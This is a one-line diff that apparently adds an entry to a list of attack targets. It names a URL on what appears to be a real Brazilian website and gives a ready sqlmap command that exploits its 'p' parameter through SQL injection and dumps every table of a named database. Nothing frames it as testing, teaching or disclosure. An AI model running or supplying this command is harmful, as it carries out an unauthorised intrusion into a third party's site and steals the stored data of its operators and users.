@@ -1,0 +1,1 @@
+https://www.daeln.com.br/disciplinasperiodo.php?p=1 (GET)  # sqlmap.py -u https://www.daeln.com.br/disciplinasperiodo.php?p=1 -D coelebr_pi2 --dump-all
